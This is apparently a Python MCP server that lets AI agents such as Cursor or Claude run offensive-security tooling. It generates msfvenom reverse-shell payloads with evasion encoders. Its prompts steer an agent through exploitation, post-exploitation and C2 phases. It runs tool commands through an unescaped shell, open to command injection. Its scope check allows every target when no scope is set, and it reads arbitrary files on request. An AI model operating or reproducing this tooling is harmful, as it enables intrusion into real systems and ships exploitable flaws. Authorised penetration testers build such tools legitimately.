"""
Offensive Security MCP Server — Cursor/Claude Compatible
Ans Inayat

Uses the official MCP Python SDK (mcp>=1.0.0) with stdio transport.
Works with Cursor Agent, Claude Desktop, Claude Code.
"""

import asyncio
import json
import os
import sys
import logging
from datetime import datetime
from pathlib import Path

from mcp.server import Server
from mcp.server.stdio import stdio_server
import mcp.types as types

sys.path.insert(0, str(Path(__file__).parent))
from tools_registry import TOOLS_REGISTRY, TOOLS_BY_NAME, TOOLS_BY_CATEGORY, OffensiveTool

LOG_DIR = Path(__file__).parent.parent / "logs"
LOG_DIR.mkdir(exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [MCP] %(levelname)s %(message)s",
    handlers=[
        logging.FileHandler(LOG_DIR / f"mcp_{datetime.now().strftime('%Y%m%d')}.log"),
        logging.StreamHandler(sys.stderr),
    ]
)
log = logging.getLogger("mcp")

SCOPE: list[str] = []
ENGAGEMENT: str = "default"
OUTPUT_DIR = Path(__file__).parent.parent / "reports"
OUTPUT_DIR.mkdir(exist_ok=True)
PAYLOAD_DIR = Path(__file__).parent.parent / "payloads"
PAYLOAD_DIR.mkdir(exist_ok=True)

server = Server("offensive-security-mcp")


def in_scope(target: str) -> bool:
    if not SCOPE:
        return True
    import ipaddress
    for s in SCOPE:
        if s.lower() in target.lower():
            return True
        try:
            net = ipaddress.ip_network(s, strict=False)
            addr = ipaddress.ip_address(target.split(":")[0])
            if addr in net:
                return True
        except ValueError:
            pass
    return False


def build_cmd(tool: OffensiveTool, args: dict) -> str:
    cmd = tool.command_template
    # Ensure tool output always lands in OUTPUT_DIR so list_reports/read_report work.
    # Many command templates use "{output}". If callers pass an "output" argument,
    # it would otherwise be substituted first and bypass our OUTPUT_DIR default.
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    forced_output = str(OUTPUT_DIR / f"{tool.name}_{ts}.txt")
    args = dict(args or {})
    args["output"] = forced_output

    for k, v in args.items():
        cmd = cmd.replace(f"{{{k}}}", str(v))
    for k, default in tool.args_schema.get("optional", {}).items():
        if f"{{{k}}}" in cmd:
            cmd = cmd.replace(f"{{{k}}}", str(default))
    cmd = cmd.replace("{output}", forced_output)
    return cmd


async def run_cmd(cmd: str, timeout: int = 300) -> dict:
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env={**os.environ, "TERM": "xterm"},
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return {
            "returncode": proc.returncode,
            "stdout": stdout.decode("utf-8", errors="replace"),
            "stderr": stderr.decode("utf-8", errors="replace"),
        }
    except asyncio.TimeoutError:
        proc.kill()
        return {"returncode": -1, "stdout": "", "stderr": f"Timed out after {timeout}s"}
    except Exception as e:
        return {"returncode": -1, "stdout": "", "stderr": str(e)}


@server.list_tools()
async def list_tools() -> list[types.Tool]:
    tools = []
    for t in TOOLS_REGISTRY:
        props = {}
        required = t.args_schema.get("required", [])
        for k in required:
            props[k] = {"type": "string", "description": f"{k} (required)"}
        for k, default in t.args_schema.get("optional", {}).items():
            props[k] = {"type": "string", "description": f"{k} (default: {default})"}
        tools.append(types.Tool(
            name=t.name,
            description=f"[{t.category.upper()}][{t.platform.upper()}][RISK:{t.risk_level.upper()}] {t.description}",
            inputSchema={"type": "object", "properties": props, "required": required},
        ))

    tools += [
        types.Tool(
            name="set_scope",
            description="Set engagement scope. Call FIRST before any attack tool. Targets outside scope are blocked.",
            inputSchema={
                "type": "object",
                "properties": {
                    "targets": {"type": "array", "items": {"type": "string"}, "description": "In-scope IPs, CIDRs, domains"},
                    "engagement_name": {"type": "string", "description": "Engagement name"},
                },
                "required": ["targets"],
            }
        ),
        types.Tool(
            name="get_scope",
            description="Get current engagement scope.",
            inputSchema={"type": "object", "properties": {}}
        ),
        types.Tool(
            name="search_tools",
            description="Search tool registry by name, tag, or keyword (e.g. 'smb', 'kerberos', 'xss').",
            inputSchema={
                "type": "object",
                "properties": {"query": {"type": "string", "description": "Search keyword"}},
                "required": ["query"],
            }
        ),
        types.Tool(
            name="list_tools_by_category",
            description="List all tools in a category.",
            inputSchema={
                "type": "object",
                "properties": {
                    "category": {"type": "string", "enum": list(TOOLS_BY_CATEGORY.keys())}
                },
                "required": ["category"],
            }
        ),
        types.Tool(
            name="suggest_attack_chain",
            description="Get recommended tool chain for a given attack phase and target type.",
            inputSchema={
                "type": "object",
                "properties": {
                    "phase": {"type": "string", "description": "recon, web, exploitation, post, lateral, privesc, wireless, password"},
                    "target_type": {"type": "string", "description": "windows, linux, web app, AD, wireless"},
                    "notes": {"type": "string", "description": "Extra context"},
                },
                "required": ["phase"],
            }
        ),
        types.Tool(
            name="generate_payload",
            description="Generate reverse shell payload via msfvenom.",
            inputSchema={
                "type": "object",
                "properties": {
                    "payload_type": {"type": "string", "enum": ["exe","elf","php","ps1","aspx","apk","jar"]},
                    "lhost":  {"type": "string"},
                    "lport":  {"type": "integer"},
                    "encoder": {"type": "string", "description": "Optional: x64/xor_dynamic, x86/shikata_ga_nai"},
                    "iterations": {"type": "integer"},
                },
                "required": ["payload_type", "lhost", "lport"],
            }
        ),
        types.Tool(
            name="list_reports",
            description="List all saved tool output files.",
            inputSchema={"type": "object", "properties": {}}
        ),
        types.Tool(
            name="read_report",
            description="Read a saved tool output file.",
            inputSchema={
                "type": "object",
                "properties": {
                    "filename": {"type": "string"},
                    "lines": {"type": "integer", "description": "Max lines (default 200)"},
                },
                "required": ["filename"],
            }
        ),
    ]
    return tools


@server.call_tool()
async def call_tool(name: str, arguments: dict) -> list[types.TextContent]:
    global SCOPE, ENGAGEMENT
    log.info(f"Tool: {name} args={json.dumps(arguments)}")

    def ok(text: str):
        return [types.TextContent(type="text", text=text)]

    def err(text: str):
        return [types.TextContent(type="text", text=f"ERROR: {text}")]

    if name == "set_scope":
        SCOPE = arguments.get("targets", [])
        ENGAGEMENT = arguments.get("engagement_name", "default")
        return ok(f"✓ Scope set for '{ENGAGEMENT}'\nTargets: {', '.join(SCOPE)}")

    if name == "get_scope":
        if not SCOPE:
            return ok("No scope set. Call set_scope first.")
        return ok(f"Engagement: {ENGAGEMENT}\nTargets:\n" + "\n".join(f"  • {t}" for t in SCOPE))

    if name == "search_tools":
        q = arguments.get("query", "").lower()
        results = [t for t in TOOLS_REGISTRY if q in t.name or q in t.description.lower() or any(q in tag for tag in t.tags)]
        if not results:
            return ok(f"No tools matching: {q}")
        lines = [f"Results for '{q}' ({len(results)}):\n"]
        for t in results:
            lines.append(f"  {t.name:<30} [{t.category}] {t.description[:60]}")
        return ok("\n".join(lines))

    if name == "list_tools_by_category":
        cat = arguments.get("category", "")
        tools = TOOLS_BY_CATEGORY.get(cat, [])
        if not tools:
            return err(f"No tools in: {cat}")
        lines = [f"[{cat.upper()}] — {len(tools)} tools:\n"]
        for t in tools:
            lines.append(f"  {t.name:<30} [{t.platform}] [{t.risk_level}] {t.description}")
        return ok("\n".join(lines))

    if name == "suggest_attack_chain":
        phase  = arguments.get("phase", "").lower()
        target = arguments.get("target_type", "").lower()
        notes  = arguments.get("notes", "")
        phase_map  = {"recon":["recon"],"scanning":["scanning"],"web":["web","scanning"],"exploitation":["exploitation"],"exploit":["exploitation"],"post":["post"],"lateral":["post","windows"],"privesc":["post","windows"],"password":["password"],"wireless":["wireless"],"c2":["c2"]}
        target_map = {"windows":["windows","password","post"],"ad":["windows","password","post"],"web":["web","scanning"],"linux":["post","scanning"],"wireless":["wireless"],"network":["recon","scanning"]}
        cats = set()
        for k, v in phase_map.items():
            if k in phase: cats.update(v)
        for k, v in target_map.items():
            if k in target: cats.update(v)
        if not cats: cats = {"recon", "scanning"}
        lines = [f"Attack Chain — {phase} / {target or 'general'}\n"]
        if notes: lines.append(f"Context: {notes}\n")
        step = 1
        for cat in ["recon","scanning","web","exploitation","password","post","windows","wireless","c2"]:
            if cat not in cats: continue
            for t in TOOLS_BY_CATEGORY.get(cat, [])[:2]:
                lines.append(f"Step {step}: {t.name}  [{t.risk_level}]")
                lines.append(f"  {t.description}")
                lines.append(f"  cmd: {t.command_template[:90]}")
                lines.append("")
                step += 1
        return ok("\n".join(lines))

    if name == "generate_payload":
        ptype = arguments.get("payload_type", "exe")
        lhost = arguments.get("lhost", "")
        lport = arguments.get("lport", 4444)
        encoder = arguments.get("encoder", "")
        iters = arguments.get("iterations", 1)
        payload_map = {"exe":("windows/x64/meterpreter/reverse_tcp","exe"),"elf":("linux/x64/meterpreter/reverse_tcp","elf"),"php":("php/meterpreter/reverse_tcp","raw"),"ps1":("cmd/windows/reverse_powershell","raw"),"aspx":("windows/x64/meterpreter/reverse_tcp","aspx"),"apk":("android/meterpreter/reverse_tcp","raw"),"jar":("java/meterpreter/reverse_tcp","jar")}
        payload, fmt = payload_map.get(ptype, ("windows/x64/meterpreter/reverse_tcp","exe"))
        out_path = PAYLOAD_DIR / f"payload_{lport}.{ptype}"
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt}"
        if encoder: cmd += f" -e {encoder} -i {iters}"
        cmd += f" -o {out_path}"
        log.info(f"Payload: {cmd}")
        result = await run_cmd(cmd, timeout=60)
        if result["returncode"] == 0:
            return ok(f"✓ Payload: {out_path}\nPayload: {payload}\nLHOST:{lhost} LPORT:{lport}\n{result['stderr']}")
        return err(f"msfvenom failed:\n{result['stderr']}")

    if name == "list_reports":
        files = sorted(OUTPUT_DIR.glob("*.txt"), key=lambda f: f.stat().st_mtime, reverse=True)
        if not files:
            return ok("No reports yet.")
        lines = [f"Reports ({len(files)}):\n"]
        for f in files[:30]:
            lines.append(f"  {f.name}  ({f.stat().st_size} bytes)")
        return ok("\n".join(lines))

    if name == "read_report":
        filename = arguments.get("filename","")
        max_lines = arguments.get("lines", 200)
        matches = sorted(OUTPUT_DIR.glob(f"*{filename}*"), key=lambda f: f.stat().st_mtime, reverse=True)
        if not matches:
            return err(f"No report matching: {filename}")
        content = "\n".join(matches[0].read_text(errors="replace").splitlines()[:max_lines])
        return ok(f"File: {matches[0].name}\n{'─'*60}\n{content}")

    # Offensive tool
    tool = TOOLS_BY_NAME.get(name)
    if not tool:
        return err(f"Unknown tool: '{name}'. Use search_tools to find available tools.")

    for key in ["target","url","domain","dc","org"]:
        if key in arguments:
            val = arguments[key]
            if not in_scope(val):
                log.warning(f"SCOPE VIOLATION: {name} against {val}")
                return err(f"SCOPE VIOLATION: '{val}' not in scope.\nScope: {', '.join(SCOPE) if SCOPE else 'not set'}")
            break

    cmd = build_cmd(tool, arguments)
    log.info(f"EXEC [{tool.risk_level}] {name}: {cmd}")
    timeouts = {"recon":300,"scanning":600,"exploitation":120,"password":3600,"wireless":600,"post":180,"web":300,"windows":180,"c2":30}
    result = await run_cmd(cmd, timeout=timeouts.get(tool.category, 120))

    out = [f"Tool: {tool.name} | Risk: {tool.risk_level} | Exit: {result['returncode']}", f"Command: {cmd}", "─"*60]
    if result["stdout"]: out.append("OUTPUT:\n" + result["stdout"][:10000])
    if result["stderr"]: out.append("STDERR:\n" + result["stderr"][:3000])
    return ok("\n".join(out))


@server.list_resources()
async def list_resources() -> list[types.Resource]:
    return [
        types.Resource(uri=f"file://{f}", name=f.name, mimeType="text/plain")
        for f in sorted(OUTPUT_DIR.glob("*.txt"), key=lambda x: x.stat().st_mtime, reverse=True)[:20]
    ]


@server.read_resource()
async def read_resource(uri: str) -> str:
    try:
        return Path(uri.replace("file://","")).read_text(errors="replace")[:50000]
    except Exception as e:
        return f"Error: {e}"


@server.list_prompts()
async def list_prompts() -> list[types.Prompt]:
    return [
        types.Prompt(name="pentest_methodology", description="Full pentest methodology with tool calls"),
        types.Prompt(name="report_finding",       description="Format finding for Daemons Zyrax report"),
        types.Prompt(name="attack_chain_builder", description="Build step-by-step attack chain"),
    ]


@server.get_prompt()
async def get_prompt(name: str, arguments: dict | None = None) -> types.GetPromptResult:
    prompts = {
        "pentest_methodology": "You are an expert pentester for Daemons Zyrax. Walk through a complete pentest for the target. Use MCP tools: start with set_scope, then recon → scanning → exploitation → post-exploitation. Call tools at each step and analyze output.",
        "report_finding": "Format this finding for a Daemons Zyrax pentest report: Title, CVSSv3, Severity, Description, Impact, PoC Evidence, Remediation, References.",
        "attack_chain_builder": "Build a step-by-step attack chain using MCP tools. For each step: objective → tool call → output analysis → next move. Chain: recon → foothold → escalation → objective.",
    }
    return types.GetPromptResult(
        description=name,
        messages=[types.PromptMessage(role="user", content=types.TextContent(type="text", text=prompts.get(name, "Not found")))]
    )


async def main():
    log.info(f"offensive-security-mcp v2.0.0 — {len(TOOLS_REGISTRY)} tools loaded")
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream, server.create_initialization_options())

if __name__ == "__main__":
    asyncio.run(main())
